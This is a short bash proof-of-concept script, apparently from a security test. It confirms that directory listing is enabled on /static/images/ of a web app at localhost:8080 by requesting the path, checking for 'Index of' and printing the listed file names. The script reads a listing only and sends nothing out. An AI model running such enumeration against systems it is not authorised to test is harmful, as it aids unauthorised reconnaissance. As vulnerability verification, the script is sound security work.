#!/bin/bash

# POC: Directory Listing Enabled on /static/images/
# This POC demonstrates that directory listing is enabled on the static images directory

TARGET_URL="http://localhost:8080/static/images/"

echo "=========================================="
echo "POC: Directory Listing Vulnerability"
echo "=========================================="
echo ""
echo "Target: $TARGET_URL"
echo ""

echo "[*] Attempting to access directory listing..."
echo ""

# Make request to the directory
RESPONSE=$(curl -s -w "\n\nHTTP_CODE:%{http_code}" "$TARGET_URL")
HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE" | cut -d':' -f2)
BODY=$(echo "$RESPONSE" | sed '/HTTP_CODE/d')

echo "HTTP Status Code: $HTTP_CODE"
echo ""

if [ "$HTTP_CODE" == "200" ]; then
    echo "[+] SUCCESS: Directory listing is accessible (HTTP 200)"
    echo ""
    
    # Check if response contains directory listing indicators
    if echo "$BODY" | grep -qi "Index of"; then
        echo "[+] CONFIRMED: Response contains 'Index of' - directory listing is enabled"
        echo ""
        echo "Directory Contents:"
        echo "-------------------"
        
        # Extract and display file/directory links
        echo "$BODY" | grep -oP '(?<=href=")[^"]*(?=")' | grep -v "^$" | while read -r item; do
            echo "  - $item"
        done
        
        echo ""
        echo "[!] VULNERABILITY CONFIRMED: Directory listing is enabled"
        echo "[!] Attackers can enumerate all files in this directory"
        echo ""
        
        # Show sample of the HTML response
        echo "Sample Response Body:"
        echo "---------------------"
        echo "$BODY" | head -n 20
        
        exit 0
    else
        echo "[-] Response does not contain expected directory listing format"
        echo ""
        echo "Response Body:"
        echo "$BODY"
        exit 1
    fi
else
    echo "[-] FAILED: Could not access directory (HTTP $HTTP_CODE)"
    echo ""
    echo "Response Body:"
    echo "$BODY"
    exit 1
fi